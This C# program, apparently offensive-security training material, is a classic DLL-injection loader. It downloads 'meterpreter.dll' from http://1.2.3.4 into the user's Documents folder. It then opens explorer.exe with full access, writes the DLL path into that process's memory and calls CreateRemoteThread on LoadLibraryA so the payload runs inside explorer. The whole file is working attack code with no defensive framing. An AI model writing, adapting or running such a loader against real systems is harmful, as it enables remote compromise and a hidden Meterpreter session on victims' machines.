using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DllInjection
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(String moduleName);


        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {

            const int PROCESS_ALL_ACCESS = 0x001F0FFF;



            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\meterpreter.dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://1.2.3.4/meterpreter.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

        }
    }
}
